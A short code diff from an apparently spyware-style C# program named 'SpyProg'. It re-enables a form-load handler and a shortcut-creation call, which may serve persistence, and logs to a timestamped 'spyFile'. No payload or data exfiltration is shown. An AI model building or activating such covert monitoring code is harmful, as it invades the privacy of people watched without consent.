@@ -20,8 +20,8 @@ namespace SpyProg {
 
         public Form1() {
             InitializeComponent();
-            //this.Load += new System.EventHandler(this.OnFormLoad);
-            //CreateShortcut();
+            this.Load += new System.EventHandler(this.OnFormLoad);
+            CreateShortcut();
 
             spyFilePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, $"spyFile({DateTime.Now.ToString("dd-MM-yyyy_HH-mm-ss")}).txt");
 
